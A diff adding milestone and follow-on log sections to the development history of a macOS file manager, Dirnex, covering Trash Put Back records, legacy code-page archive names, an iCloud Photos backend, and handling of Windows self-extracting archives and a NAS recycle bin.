+    in it. A record Dirnex wrote itself needs none of that — so this closes M9's gap for **Dirnex's
+    own** deletes, without touching the reason it is still open for Finder's.
+  - **What it still cannot do, and must not claim**: an item **Finder** deleted out of a provider
+    domain — on Box that does not land on this Mac at all, it goes to Box's server-side trash — and
+    anything trashed before the store shipped. Both keep today's honest answer, which the restore
+    flow already gives by name rather than by guessing at a folder.
+  - **All four controls run and they fail on disjoint tests**, which is what makes the twenty-three
+    green ones evidence. Making the restore index ignore the store fails *only* the wiring test and
+    leaves the seven narrowness tests green; inverting the merge fails *only* «Finder's record wins»,
+    and its message is the plan's own sentence — an ordinary local item resolving to
+    `/Users/oleg/Wrong` instead of `/Users/oleg/Documents`; deleting the `record` call in
+    ``noteTrashed`` fails *only* the write-side test; and neutering the vault predicate fails *only*
+    the vault test.
+  - **The vault control found a defect in the tests rather than in the code, which is the half worth
+    keeping.** It failed three tests instead of one, and the two extras were the suite's own: two
+    tests swap ``TrashOriginStore/shared``, which is one piece of process state, and Swift Testing
+    runs a suite in parallel — so they filed into each other's scratch stores. `.serialized` on the
+    merits (shared mutable state), not as a flake workaround, and the control then fires on exactly
+    the vault test. A control that fires *too widely* is as much a finding as one that fires at all.
+  - **The app test target runs inside the app, so the suite was writing fake origins into the
+    developer's own store.** `UserDefaults.standard` there *is* `com.dirnex.Dirnex`, and every pane
+    the trashless harness builds can reach `runDelete` — measured, `Dirnex.putBackOrigins` held a
+    record naming `/Volumes/Photos` after a full run. Same shape as the S3 live suites' Keychain
+    capture: a store keyed by what it describes cannot tell who wrote it. `TrashlessProbe.pane`
+    now installs a scratch domain once per process, and the key stays absent across a full run —
+    which is a positive control, since it was present before.
+  - **Verified live against all five domains, LaunchServices-launched**, with the same `reveal` +
+    `run operation "file.trash"` driving as the milestone's own end-to-end run: **6 of 6 deleted and
+    6 of 6 recorded**, each origin naming the folder it came from and each landing exactly where the
+    Slice 2 table predicts. The decisive half is a raw byte scan of the three trashes' `.DS_Store`
+    files — deliberately **not** `DSStoreReader`, since using our own parser as the oracle would only
+    prove the two agree: **`drive-mirror` is the only one of the six Finder has a `ptbL` for**, which
+    is exactly the item that went through `trashItem`. So the two branches of the merge rule are not
+    hypothetical — five of these six items had no way home before this slice and one keeps Finder's
+    record, measured on one run.
+  - **What the live run could not reach is the Put Back gesture itself**, and the reason is the
+    documented developer-machine one rather than anything about the fix: the Trash pane is only
+    reachable from its sidebar row, and a rebuilt ad-hoc-signed Debug binary has lost its Full Disk
+    Access grant (`Signature=adhoc`, `TeamIdentifier=not set`), so clicking it raises the onboarding
+    sheet. Re-granting is password-gated. The read half is covered instead by an app test driving the
+    real ``TrashOriginIndex`` — the one place the two sources meet — with the control above.
+    **The gesture itself was confirmed by the user on 2026-09-01**: Put Back works.
+
+- **Slice 5 — Put Back in *Finder*, for a provider delete. Landed 2026-08-31.** Reported by the same
+  user hours after Slice 4 shipped, with two screenshots of Finder's own context menu over the same
+  file: deleted from Dropbox in Dirnex, no **Put Back**; deleted from Dropbox in Finder, Put Back.
+  Slice 4 is not the answer to that and never was — it gave *Dirnex's* Put Back the origin, and
+  Finder is where a person looks. Every one of the five domains had it; Dropbox is simply the one
+  they tried.
+  - **The premise this milestone opened on is retired: the record *can* be written.** Slice 2 said
+    the `ptbL`/`ptbN` pair is one "this package can read and cannot write", and that was an
+    assumption about effort rather than a measurement. `.DS_Store` is a documented-by-reverse-
+    engineering buddy allocator holding a B-tree, and `DSStoreReader` already models all of it but
+    the direction. ``DSStoreWriter`` is the other direction: a bulk load rather than an insertion,
+    since the file is small and rewritten whole, so there is no split, merge or rebalance to get
+    wrong.
+  - **Finder was asked before any Swift was written, and it answered three times.** Against the live
+    `~/.Trash`: a Dropbox file renamed in by hand had no Put Back — the reported bug, reproduced —
+    and with a pair written by a throwaway writer the **same already-open context menu** grew one and
+    restored the file to its Dropbox folder. Again in Google Drive's `<mount>/.Trash`, from a
+    database created from nothing, which is the state every provider trash is in. The half that makes
+    it more than "Finder tolerated our file": Finder then **rewrote it from our content**, all 284 of
+    its own records intact — it took our output as its own database.
+  - **A rewrite has to put back what it does not understand**, which decides the reader's shape.
+    ``DSStoreRecord`` answers *what does this say*; ``DSStoreEntry`` is the format's own unit, with
+    the value kept exactly as written, so a record this build has no opinion about — Finder's window
+    furniture in a folder that is not a trash, anything a later macOS adds — survives byte for byte
+    rather than depending on a switch somebody has to keep complete.
+  - **The ordering is the one thing a malformed tree fails *quietly* on**, and it was validated
+    rather than assumed: the 284 records in this Mac's own `~/.Trash/.DS_Store`, written by Finder
+    and `trashItem` over months, have **zero inversions** under case-insensitive-name-then-property.
+    A tree sorted differently still parses, and Finder's own lookup walks into the wrong child and
+    answers "no record".
+  - **The fixture caught a real defect, which is the argument for having it as the oracle.** Asked to
+    produce the location string for each folder the fixture already records, the writer answered
+    `//` where macOS wrote `/` for the volume's own root. Comparing against a string this code
+    produced would have proved the two halves agree; comparing against macOS's is what found it.
+  - **The dangerous failure is not a wrong record, it is a lost database**, and two rules answer it.
+    A parse this build cannot complete leaves the file untouched — and *only a file that is genuinely
+    absent* counts as "no database yet", because `~/.Trash` is behind Full Disk Access and a refused
+    read presented as an empty database would replace 142 of Finder's records with the one row we
+    came to add. The output is also parsed back before it replaces anything, which is the guard about
+    *this* code rather than about the filesystem.
+  - **Verified end to end through the shipped F8, LaunchServices-launched**, with a control that came
+    free: a Google Drive file deleted in Dirnex, and in the same `<mount>/.Trash` a neighbour that
+    got there another way. Finder offers Put Back on the first and **not** on the second, in the same
+    folder and the same menu — so it is the item's own record doing the work, not something about the
+    directory — and Put Back returned the file to `My Drive`. The instrumented run names each step
+    (`route provider=true`, `landed=…/.Trash/…`, `store read`, `wrote 4100 bytes`), which is what
+    turns "it works" into which branch ran.
+  - **What the same run could not reach is `~/.Trash`, and the reason is the developer-machine one
+    Slice 4 already hit**: a rebuilt ad-hoc-signed Debug binary has lost Full Disk Access, so the
+    probe recorded `NSCocoaErrorDomain 257` reading `~/.Trash/.DS_Store` while the TCC row still read
+    *allowed* — the stale-code-requirement state docs/NOTES.md documents. The safety rule above did
+    exactly its job (the user's 284 records were byte-identical afterwards), and the write half of
+    that path is what the by-hand run above measured against the real file. Re-granting is
+    password-gated, so it was the user's to do — and it was: **Put Back reported working on
+    2026-09-01**, which is the one instrument that half had.
+  - **Slice 4's store is not retired by this and must not be**: it answers where a `.DS_Store` cannot
+    be written at all — no Full Disk Access, a read-only trash — and for an item **Finder** deleted
+    out of a domain. The merge rule is unchanged and now agrees with itself: where both sources speak
+    they were both written from the same origin.
+  - **Five controls run and each fails on its own claim**: a recorder that writes nothing fails the
+    six recorder tests and the wiring test and leaves the two refusal tests green; removing the call
+    from the performer fails *only* the wiring test; treating an unreadable database as empty fails
+    *only* the "left exactly as it was" test; a writer that does not sort fails *only* the ordering
+    test; and always prefixing the recorded location with a slash fails *only* the path-form test.
+    The narrowness test that matters most stays green throughout — an **ordinary** item is still left
+    to `trashItem`, and nothing is written here for it, because two writers over one database would
+    be two sources answering one question.
+
+Left deliberately undone: **the remote backends**, which have no Trash at all and are already
+degraded to a confirmed permanent delete (§M5, and M25 §7's decision not to invent one); **any
+workaround inside F8 while it was open**, since ⇧F8's confirmed permanent delete already worked — it
+uses `removeItem` and consults no Trash, so it was never affected; and **chasing the refusal further
+into TCC and `fileproviderd`**, which is not observable from here past the three candidates already
+eliminated, and which neither implementable route depended on.
+
+### M27 — Legacy code-page archive names (S)
+
+**Closed 2026-09-09** (▸ the follow-on log below): a zip whose entry names are stored in an OEM
+code page can be *declared* (``ArchiveNameEncoding``, 19 of them), after which it lists, previews,
+extracts and **rewrites** like any other archive — the refusal M26-era work left in place, closed by
+asking the one question no reader can answer for itself. Three measurements shaped it and are worth
+not re-deriving: APFS refuses a non-UTF-8 file name outright (`EILSEQ`) and the rewrite stages on
+disk, so declaring is the *only* route rather than the tidiest; libarchive's `hdrcharset` read option
+is the lever and **Apple's `bsdtar` does not have it**, so a declared archive is read in-process
+while the repack stays on `bsdtar`, which is what preserves the container format; and a wrong code
+page cannot be detected — it returns well-formed nonsense — so the chooser previews real names and
+offers only the candidates that *fit*. A streaming entry-to-entry rewrite was costed and rejected: it
+preserves bytes nobody can read, still cannot extract that row out of the archive, and needs a third
+engine.
+
+Both remaining slices landed the same day:
+
+- **A way in from the pane** is `file.archiveNameEncoding` ("Archive Name Encoding…"), a registry
+  command in the File menu beside Pack — so somebody who merely wants to *read* the names no longer
+  has to make a gesture **fail** to be offered the chooser. Enabled off one property both the action
+  and `validateMenuItem` read (``archiveAwaitingNameEncoding``), which is the trap this file's own
+  most-repeated family names; no submenu, so its key equivalent could fire if it ever gained one. The
+  predicate is a question about the *archive* — ``ArchiveTOC/hasUnreadableNames``, computed once at
+  mount and peeked from the cache so a validator never spawns `bsdtar` — and it stays true once a
+  code page has been declared, since a wrong pick raises no second refusal and changing your mind
+  would otherwise be impossible.
+- **The thirteen translations** are in, and `ArchiveNameEncodingLocalizationTests` now demands them
+  rather than pinning English-only. Adding the command also put `scripts/check_localization_keys.py`
+  to work: it named **three strings from the landing** — the chooser's title, body and Use button —
+  that were correctly wrapped and never added to the catalog, so they rendered English inside every
+  translated build.
+
+All five *unverified* paths were measured rather than argued, and two of them turned out to be
+wrong. Two on the day the milestone closed:
+
+- A **`.tar.gz`** whose names are in a code page behaves identically to the zip, and the rewrite
+  keeps its container (asserted on the gzip magic — a repack that fell back to zip holds the right
+  members and is invisible to every assertion about them).
+- **The chooser's cost was bounded on the wrong quantity.** Not "sampling stops at the first few
+  non-ASCII names" but the archive *open*: measured, every one of the 19 candidates costs the same
+  ~260 ms on a 50 000-entry zip whichever way it exits, for **3.6 s** in total on the main actor
+  before the sheet (4.9 s with the non-ASCII names last; 5 ms at 2 entries, 81 ms at 1 000). The
+  reads moved to `BlockingWork.run`. The twenty-times-faster shape — one open, since
+  `archive_entry_pathname` hands back the raw bytes with no `hdrcharset` set — was refused because it
+  would decode with CoreFoundation while the listing decodes with libarchive's iconv, and a preview
+  whose job is to be recognised must come from the reader that will do the reading.
+
+And the last three later the same day, where the first was hiding a bug (▸ the follow-on log
+below). An archive that is **encrypted *and* legacy** cannot be packed by anything on this
+Mac — APFS refuses a non-UTF-8 name and nothing but Dirnex writes AES-256 — so `LegacyNameZip` mints
+one by packing each non-ASCII member under an ASCII placeholder of the **same byte length** and
+rewriting its name bytes in both headers, nothing in zip checksumming a name. The reader composes the
+passphrase and the code page exactly as argued; the **routing in front of it** did not.
+`ArchiveExtractor.needsPassphrase` was derived from an inspection that a legacy archive makes throw,
+so the `try?` read that throw as *"not encrypted"*, no passphrase was asked for, and the extraction
+fell through to `bsdtar` — which spent **6.10 s** and **170 144 bytes** of `Enter passphrase:` and
+wrote an **8-byte file of zeros** under the right name, reported as a success by the guard that asks
+whether anything landed. ``EncryptedArchiveReader/holdsEncryptedEntries(archiveAt:)`` answers off the
+raw header instead, and `needsPassphrase`'s code-page parameter went away with it. The same routing
+had made **F5 copy-out** the one claimed way into the chooser that was not one: `bsdtar` cannot be
+handed a name it could not decode, so nothing landed and the refusal came back as a damaged archive.
+
+The other two paths were sound. ⏎ into a nested archive named in CP866 is driven end to end, and the
+preview cache's stale entry is better than unreachable — it cannot be **minted**, since the only row
+a cursor can rest on beforehand is named in U+FFFD substitutes and that extraction refuses rather
+than caching anything, while an ASCII member cached before a declaration stays correct because the
+file has not changed. The write-back batch's own sheet stays undrivable, so what runs is everything
+after the answer: `ArchiveWriter.add` under a declaration.
+
+Left deliberately undone: **inferring** the code page (no reader can, and a wrong guess is a
+plausible name for the wrong file); **preserving an un-representable name byte-for-byte**, which is
+the rejected streaming rewrite; and **persisting the declaration** across sessions — it is a guess
+the user made about one archive, and a wrong one silently outliving the session is worse than being
+asked again.
+
+### M28 — iCloud Photos, as folders of originals (M)
+
+**Closed 2026-09-13**, the day it opened: the system Photos library browses as years, months and
+each asset's original files, beside `/Albums` for the albums and folders a person made. It is
+read-only and goes through **PhotoKit**, the one exception the plan's §1 non-goal takes, because the
+library exposes no browsable filesystem. All four slices landed that day. Three measurements are
+worth not re-deriving. A file name costs ~1.1 ms per asset and does not parallelize, which is what
+forced years-then-months over a flat "All Photos". PhotoKit's archived change token is byte-stable,
+which is what lets each month's and each album's rows be cached against it. And Photos' own Export
+Unmodified Original sets a birth time equal to the capture date and keeps everything else, the
+`com.apple.cpl.*` markers included, which overturned the last slice's plan to clear them and move
+the modification time.
+
+Some paths were not exercised by the close, and are recorded rather than argued. The **download of
+an original that is only in iCloud** had only the probe's measurements behind it, because the
+library held no evicted original on the day, until later that evening, when clips recorded on an
+iPhone for the purpose were run through Dirnex. It had two bugs, one cause: the request carried no
+progress handler. PhotoKit downloads the whole original into the library before handing over a
+byte, so the bar sat at "Zero KB" for the whole download; and without a handler
+`cancelDataRequest` does not stop that download, so Stop on a 1.1 GB clip took effect about 75 s
+later, once it had finished. `PhotoKitLibrary` now always sets one and reports the larger of the
+bytes written and the download's fraction of the size. A 219 MB clip then showed a moving bar and
+arrived SHA-256-identical to the library's stored original, born at its capture time. An A/B in a
+probe showed the cancel stopping the download within 1 ms with a handler, and being ignored without
+one. Through Dirnex, Stop on a 276 MB clip then ended the request with `userCancelled`, the CloudKit
+download finished at the same instant, the partial file was gone within 0.1 s, and the original was
+still not in the library 105 s later (docs/NOTES.md ▸ iCloud Photos). Neither a
+**refused grant's sentence** nor the **`Undated` folder** was seen live. And whether a Developer ID
+build's certificate-based requirement carries the Photos grant across updates, as Full Disk
+Access's does, is unmeasured (docs/NOTES.md ▸ iCloud Photos).
+
+Left deliberately undone: **import, delete and album edits**, each a write Photos mediates with its
+own confirmation; **smart albums**, since one a person made is returned by no PhotoKit fetch and the
+system ones are views over the library rather than places; **shared albums, the Shared Library and
+hidden photos**, left out as Photos' own Library view leaves them out; **a per-asset time zone**,
+which PhotoKit does not expose, so months are cut in the Mac's; **⌘L inside the library**, which has
+no real directory to start from; and the parts of Photos' export that are not dates: the quarantine
+flag rewritten with Photos as its agent, the last-opened date, and the lowercase `.mov` for a Live
+Photo's movie, since a row's name is part of its path.
+
+The section as the plan carried it through the milestone:
+
+**Opened 2026-09-13**, on the probe recorded in docs/NOTES.md ▸ iCloud Photos (PhotoKit). The
+system Photos library is not a place the filesystem exposes: its originals sit inside
+`Photos Library.photoslibrary` named by asset UUID, and an evicted one is *absent* rather than a
+placeholder. So it cannot follow iCloud Drive (§M9), and it is a backend of its own over **PhotoKit**
+— the exception §1's non-goal now names.
+
+Decided before Slice 1. Each is a recommendation that is cheap to overturn until Slice 2 puts it in
+front of a user:
+
+- **Originals are rows** (2026-09-13). A Live Photo is two rows, `IMG_0089.HEIC` and
+  `IMG_0089.MOV`. An edit's `FullSizeRender.heic`, `Adjustments.plist` and the undocumented type-16
+  `.aae` are not rows, and neither is any other resource PhotoKit does not name as an original.
+- **Years, then months.** The root lists `2026`, `2025`, … plus an `Undated` folder when an asset has
+  no capture date; a year lists `2026-08` and its siblings; a month lists originals. The month folder
+  carries its year so a folder copied out still says what it is. Grouping is in the Mac's time zone,
+  since PhotoKit exposes none per asset, so a photo taken near midnight elsewhere can sit in the
+  neighbouring month. The structure is forced by a measurement rather than chosen for tidiness: a
+  name costs ~1.1 ms per asset and does not parallelize, so a flat 30 000-asset "All Photos" would be
+  ~35 s of names.
+- **A row's date is its capture date**, in both columns. PhotoKit's `modificationDate` moves whenever
+  Photos touches metadata — every asset in the probe library read `2026-04-09 10:07:29`, a
+  migration — so it would sort a library by nothing.
+- **A colliding name is numbered**, `IMG_0001 (2).JPG`, case- and normalization-insensitively, in
+  capture order; two cameras both counting from `IMG_0001` is ordinary. Finder's keep-both "copy" is
+  the wrong word for two different photographs. The number is part of the path, so importing an
+  older duplicate later can renumber a row — stated rather than engineered around, while M28 is
+  read-only.
+- **What Photos hides by default stays hidden**: hidden assets, a burst's unpicked frames, shared
+  albums and the Shared Library.
+- **Read-only.** F5 out, Quick View, ⌘Y, Open With and the other M24 hand-offs, all through the
+  materialize path the remote backends already use. Import, delete and album edits are each a
+  Photos-mediated write with its own system confirmation, and none of them is in this milestone.
+
+#### Slices
+
+1. **The core** (additive, app untouched). `VFSBackendID.photos`; `PhotosLibraryTransport`, the four
+   things the app's PhotoKit adapter answers (a cheap dated fetch, the expensive resource read, a
+   change token, an export); `PhotosLayout`, the pure path ⇄ folder ⇄ row rules above; and
+   `PhotosBackend`, read-only. It caches each month's rows against the change token, because
+   resolving a path back to an asset costs the whole month's names: without the cache, F5 of 300
+   photos from a month of 300 would pay ~99 s of them. Tested against a fake fed the probe library's
+   real names, identifiers, sizes and dates.
+   **Landed 2026-09-13**: 32 tests in three suites, and four negative controls that each failed their
+   own tests before being restored byte-identical — a cache that never hits, every resource counted
+   as an original, the backend skipping its membership filter, and no numbering. One claim needed a
+   test the first draft lacked: a transport answering *wide* cannot put a row in the wrong month,
+   since a fake that filters exactly passes with the backend's own filter deleted. The core suite is
+   green at 3311. The app suite, untouched, was green on its second run; the first failed one
+   nested-archive chooser test after a 57 s wait while a filtered core run overlapped it, and that
+   suite passed alone in 0.85 s.
+2. **The app.** The PhotoKit transport: a dated fetch with hidden assets excluded; names through
+   `PHAssetResource`; the size through the `fileSize` KVC key, guarded, since it is undocumented and
+   the only source; and export as `writeData` with the network off (a clone, or error 3164 in
+   milliseconds) followed by `requestData` with it on, streamed to the file so Stop cancels. The
+   entitlement and `NSPhotoLibraryUsageDescription` **in the same change**, since a missing usage
+   string kills the app on its first call. Routing in `CompositeBackend`; a sidebar row; the
+   authorization flow (not determined → ask; denied → a sentence naming Privacy ▸ Photos, never Full
+   Disk Access). An audit of every `isRemoteConnection`-shaped predicate, deciding per site whether
+   `.photos` belongs (docs/NOTES.md ▸ AppKit: a new backend has to be named at every site that lists
+   the old ones). Verified live against this Mac's library, an evicted original included, and the
+   docs/LOCATION-SUPPORT.md column.
+   **Landed 2026-09-13, with one path unexercised**: the evicted original. The library had none that
+   day, because the probe had downloaded all six back, so the streamed iCloud download has only the
+   probe's measurements behind it, and neither a refused grant's sentence nor the `Undated` folder
+   was seen live either. What held against this Mac's library: the sidebar row raised macOS's Photos
+   prompt, because an ad-hoc rebuild matches no earlier grant (docs/NOTES.md ▸ iCloud Photos), and
+   Allow let the listing through; the root listed five years, a year its months, and `2026-08` its
+   ten originals with Live Photo pairs, sizes and capture dates; the crumbs read `Photos › 2026 ›
+   2026-08`; Quick View rendered a HEIC through the remote fetch; F5 copied `IMG_0222.HEIC` out
+   byte-identical as a clone with its own inode; and a relaunch brought the tab back with its
+   cursor. The audit put `.photos` into `isRemoteConnection` — re-listable, not on this disk — and
+   named it ahead of that test at the sites that meant a server: the permission sentence, the path
+   bar, `TabRestorePolicy` (a new `photosLibrary` requirement) and the router. Nothing registers a
+   write-back, because `canEditRemoteFile` needs `acceptsUploads`. An archived change token was
+   measured byte-stable, one distinct value over 1000 reads, which is what lets the month cache hit.
+   The core suite is green at 3317 and the app suite at 1164; all 1014 extracted strings are in the
+   catalogs, the usage description is translated through a new `InfoPlist.xcstrings`, and the
+   entitlement lives in `Packaging/Dirnex.entitlements`.
+3. **Albums.** `/Albums/…`: user albums and the folders they sit in. The probe library has none, so
+   the slice opens by probing one that does.
+   **Landed 2026-09-13.** The probe had to make its library first: Oleg made two albums and the rest
+   was built in Photos.app through its own menus — nested folders, an album titled `Summer/Beach`,
+   one photo in two `Lisbon`s, an empty album, a second `Rainbow`, an album `Trips` beside the folder
+   `Trips`, a hidden member and a smart album (docs/NOTES.md ▸ iCloud Photos). What it settled, each
+   now a rule in the core:
+   - **`/Albums` sits beside the years**, under a translated title over an English path, and exists
+     only while the library holds an album or a folder. An empty *album* does exist.
+   - **Albums and folders share one set of names per level, numbered in the sidebar's order**, which
+     PhotoKit returns and Photos puts newest first — so the empty `Trips` made last keeps the name and
+     the real folder reads `Trips (2)`. A title's number goes at the end (`Mr. Smith (2)`), and a `/`
+     reads `:`.
+   - **A path is resolved by walking**, since `/Albums/Trips/Lisbon` cannot say whether `Lisbon` is an
+     album or a photo. Each level and each album's rows are cached against the change token.
+   - **An album holds the month's rows**, named by the same capture-order rule, because PhotoKit's own
+     order is the album's sort setting and moves when a person re-sorts it.
+   - **Not there, and cannot be**: a smart album a person made, which PhotoKit returns from no fetch
+     at all; the system smart albums, which are views; and a hidden photo, absent from albums even with
+     `includeHiddenAssets` on.
+   The same run measured Slice 4's premise: a `PHPhotoLibraryChangeObserver` in another process
+   heard all 51 changes Photos.app made, on a background thread.
+   Core: `PhotosLayout+Names`, `PhotosBackend+Albums` and two transport verbs, 3337 tests with 20 new,
+   and five negative controls — four failing their own tests, and one (walking an album as a folder)
+   inert for a stated reason: the library refuses an album's id as a folder, so both builds answer
+   `notFound`; it was replaced by resolving on the raw title, which failed five tests. App: the two
+   verbs in `PhotoKitLibrary`, `PhotosPresentation.albumsTitle` translated in all 14 languages, and the
+   stub and names tests; 1166 app tests green. Verified live on this Mac's library: the root listed
+   `Albums` beside five years, it listed all seven names with the numbering above, the crumbs read
+   `Photos › Albums › Trips (2) › 2025 › Summer:Beach`, `Lisbon` left out its hidden photo, and F5 of
+   `IMG_0207.HEIC` out of the nested album arrived SHA-256-identical as a clone with its own inode.
+   **One bug came out of the live run, and it was Slice 2's**: the tab restored before the rebuild's
+   grant kept its status line saying the library could not be read after the timer had re-listed it,
+   because only a navigation cleared a restored tab's reason. A re-list clears it now
+   (`clearOfflineReasonAnsweredByListing`), with a control that fails without it.
+4. **Freshness and fidelity.** A refresh driven by the change token; and an exported original stamped
+   with its capture date and cleared of `com.apple.cpl.*`, measured first against what Photos' own
+   **Export Unmodified Original** writes, so the result matches what a user compares it with.
+   **Landed 2026-09-13, and the measurement changed the second half.** Photos' menu export and a
+   `writeData` export of the same two assets (docs/NOTES.md ▸ iCloud Photos) gave identical bytes
+   and the library file's modification time to the nanosecond. What Photos adds is a **birth time
+   equal to the capture date**, on a Live Photo's movie as well as its photo. It **keeps**
+   `com.apple.cpl.original` and `cpl.delete`. So an export now gets that birth time and nothing else
+   (`PhotosBackend.stampCaptureDate`, best-effort). Clearing the markers or moving the modification
+   time, as this item said, would have made a Dirnex export differ from Photos'. Two differences are
+   left and stated: Photos rewrites the quarantine flag with itself as the agent, and it writes the
+   movie as `IMG_0089.mov` where the row stays `IMG_0089.MOV`, PhotoKit's own name.
+   - **Freshness: the library wakes the pane.** `RemoteRefreshPolicy.trigger(for:)` answers
+     `.libraryChange` for `.photos` and `.timer` for every server. The app's
+     `PhotosLibraryChangeMonitor` counts `PHPhotoLibraryChangeObserver` deliveries, and a pane's
+     loop waits for a generation it has not refreshed at, where a server pane sleeps. It keeps the
+     occlusion gate, with catch-up when the pane is uncovered, and the duty cycle
+     (`delayAfterLibraryChange`, never under a 0.5 s settle for a gesture's burst), and it ignores
+     the floor, since a change arriving contacts nothing. Registering is guarded on access already
+     granted, and the first registration counts as a change, so a tab restored before the grant
+     recovers by itself. An idle library heard one delivery in 17 minutes.
+   - **Verified live** on the rebuilt Debug build with the floor at 0: a restored Photos tab that
+     said it could not read the library recovered with no gesture once the grant was given in the
+     other pane; an album renamed by a separate PhotoKit process showed the new name within 6 s and
+     the old one again after it was renamed back; and F5 of `IMG_0089.HEIC` and `IMG_0089.MOV`
+     arrived SHA-256-identical to Photos' own export, born at 14:04:12.274Z, with the same mtime and
+     `cpl` markers. The download of an original that is only in iCloud was still unexercised here:
+     the library held none. It was run later that evening, and the close above records what it found.
+   - Core 3347 tests (10 new) and app 1170 (4 new), both linters clean, and all 1015 extracted
+     strings in the catalogs. Five negative controls each failed their own tests and were restored
+     byte-identical: Photos on a timer, no settle floor, no stamp, stamping the modification time
+     too, and stripping the `cpl` markers.
+
+---
+
+### After M19 — the follow-on log (2026-08-07 → 2026-09-21)
+
+Ninety-one dated passes that landed outside a milestone of their own, between M18's close on
+2026-08-07 and 2026-09-21: user-reported bugs, three vault features, the tree crossing into S3,
+the chain of five that one S3 rename pulled apart, and the pair a share with no Trash pulled apart
+in the same way. They ran *alongside* M20, M21 and M22 rather than after them — which is why they
+sit here at the end rather than in a numeric slot — and they keep their **newest-first** order,
+because several read as a chain and refer to the entry below. Moved out of [PLAN.md](../PLAN.md)
+§4 on 2026-08-23, once the plan had nothing left to say about them; what is still open from this
+stretch stayed there. The last six came out of **§5** on 2026-09-10 for the same reason — the
+plan keeps the testing *strategy*, which is a rule, and the history keeps what each pass *found*.
+
+**2026-09-21 — A Windows self-extractor browses as an archive, and can never be rewritten.
+VERIFIED against the reported file, headlessly; the GUI pass is still owed.** Reported with a
+screenshot: an inner `…-Win10.zip` inside a zip failed with *"Couldn’t read the archive"*, where Total
+Commander opens it. It is not a zip. `file` calls it a PE32 executable — a 126 KB 7zSFX stub (Oleg
+Scherbakov's module), 71 bytes of its configuration (`RunProgram="openvpn-postinstall.exe"`), then
+an ordinary 7z, which `bsdtar` lists the moment the stub is cut off. libarchive 3.7.4 *does* look
+for a 7z inside a PE, but only between `0x27000` and `0x60000`, and this archive starts at `0x1EC47`.
+A zip behind the same stub lists fine (the zip reader works back from the end), and so does a 7z
+moved to `0x28000`, so the gap is exactly a 7z behind a small stub — which is what installers are.
+
+`bsdtar` cannot be handed the archive in place, measured both ways: piped, *"A file descriptor(0)
+is not seekable"*; as a stdin already seeked to the archive, libarchive seeks it to *absolute*
+offsets, reads the stub and fails *"Unexpected Property ID"*. A C probe opening the same file through
+`archive_read_open2` with read/seek/skip callbacks shifted by the offset listed all six entries in 3
+reads and extracted `openvpn-install.exe` byte-identical to `bsdtar`'s extraction of the cut-out
+payload; at offset 0 the same probe failed exactly as `bsdtar` does.
+
+So the core gained ``SelfExtractingArchive`` — the PE image's end from its section table, then the
+first 7z start header after it whose CRC verifies and whose next header fits inside the file — and
+``ArchiveByteWindow``, the callbacks. `EncryptedArchiveReader.openForReading` is the one funnel every
+in-process read comes through, so the listing, the extraction, the encryption check and the
+code-page samples all read a self-extractor at once; `ArchiveMounter` and `ArchiveExtractor.unpack`
+send a windowed 7z down that route, the way they already did for a declared code page. The parse
+was checked against real binaries before it was written: signed programs from the Parallels and
+.NET SDK bundles have 12 200 and 10 184 bytes past their image, which is their **certificate
+table** — so "something appended" is never taken to mean "an archive appended".
+
+**The half that is new risk rather than new reach is writing.** A rewrite repacks the archive alone,
+so it would put a bare archive where the program was, and under a `.zip` name `bsdtar -a` would
+even turn a 7z into a zip. Three hand copies of the nested-mount test — `isWritableArchive`,
+`isWritableArchiveMember` and `renameRoute` — became one `archiveAcceptsWrites(atOnDiskPath:)`,
+reading a fact the mount records (`ArchiveBackend.isSelfExtracting`, peeked like
+`hasUnreadableNames`), and `ArchiveWriter.rewrite` refuses a self-extractor by itself with a reason
+of its own, in all fourteen languages. The control on that guard is the finding worth keeping:
+with it removed, renaming a member of a **zip** self-extractor *succeeded* and rewrote the file,
+stub gone — reachable before today for any zip SFX with a browsable name. The 7z one failed only
+because `bsdtar` could not unpack it.
+
+Controls, each alone: the window removed failed both reader tests with `archiveUnreadable`, and the
+mount's routing removed failed the listing with `archiveUnreadable(archive: "installer-Win10.zip")`
+— the report's error; the extractor's routing, the gate's new clause and the writer's guard each
+failed their own test; *"an ordinary archive stays writable"* stayed green throughout. The CRC
+control first fired in one of its two tests: a decoy of signature-plus-garbage points past the end of
+any file, so the **bound** rejected it before the CRC was asked — rewritten as a header only the CRC
+can refuse, it fails as intended.
+
+Verified against the reported file through the real core in a scratch package: 6 entries listed in
+0.4 ms, `openvpn-install.exe` placed in 11 ms, byte-identical to `bsdtar`'s. **Not driven on screen**:
+the release build was the one running, and launching the Debug build beside it is the
+second-copy trap (docs/NOTES.md ▸ Live verification); the pane's ⏎ into the nested member is covered
+by the app suite on a synthetic self-extractor, through `CompositeBackend`'s real mount. Left as
+stated limits: a file *named* `.exe` still launches on ⏎ rather than browsing (a product question,
+asked rather than decided); only a 7z is looked for behind a stub, because a zip already works and
+RAR and CAB self-extractors are unmeasured; and a Linux (ELF) self-extractor is not looked for.
+
+**2026-09-20 — Put Back for a network share's own `#recycle`, and the delete that is not permanent.
+VERIFIED LIVE.** Opened as a question rather than a request — *"NAS smb has #recycle folder, is it
+possible to display, restore, copy, move, delete files in it?"* — with a File Station screenshot and
+a test account. §2's rule answered most of it before any Swift: mounted, a `#recycle` is an
+**ordinary directory** on an ordinary `/Volumes/…` tree, with no dot prefix and no `UF_HIDDEN`, so
+`LocalBackend` already listed it and copy, move, rename, create and delete inside it were already
+working. Confirmed in the running app in the same pass. What was missing was the one gesture the bin
+exists for.
+
+**Probing found the feature's whole mechanism, and corrected the first conclusion.** A `find` run in
+the same command as an `rm` showed the bin unchanged — *"the recycle bin does not catch SMB
+deletes"*, clean and wrong: it is the macOS SMB client's **directory cache**, and timed properly the
+file is there in under 0.5 s (NOTES.md ▸ The Trash). It does catch them, and the shape it leaves is
+the feature: deleting `probe/sub/nested.txt` from the share root left it at
+`#recycle/probe/sub/nested.txt` — **the path is the entire origin record**. No database, nothing that
+can go stale, which is the opposite of Finder's Put Back, where the origin lives only in a
+`.DS_Store` B-tree and is absent for everything Finder never wrote a record for. So restoring is a
+move to the same relative path one level up, and it is *more* reliable than the macOS gesture it
+sits beside.
+
+**Relative to the bin's parent, never to the volume**, which is the one decision that is not
+cosmetic: DSM keeps one bin per *shared folder*, so mounting `home` puts `#recycle` at the volume
+root while mounting `homes` puts one at `homes/<user>/#recycle` — a volume-anchored rule restores the
+second case into the wrong folder. ``ShareRecycleBin`` is the pure half, deliberately **not**
+`TrashLocations.isInsideTrash`: that predicate withdraws `.trash` and `.rename` and pulls a location
+into the merged `trash:` listing, and the bin is the *server's* — it exists only while the share is
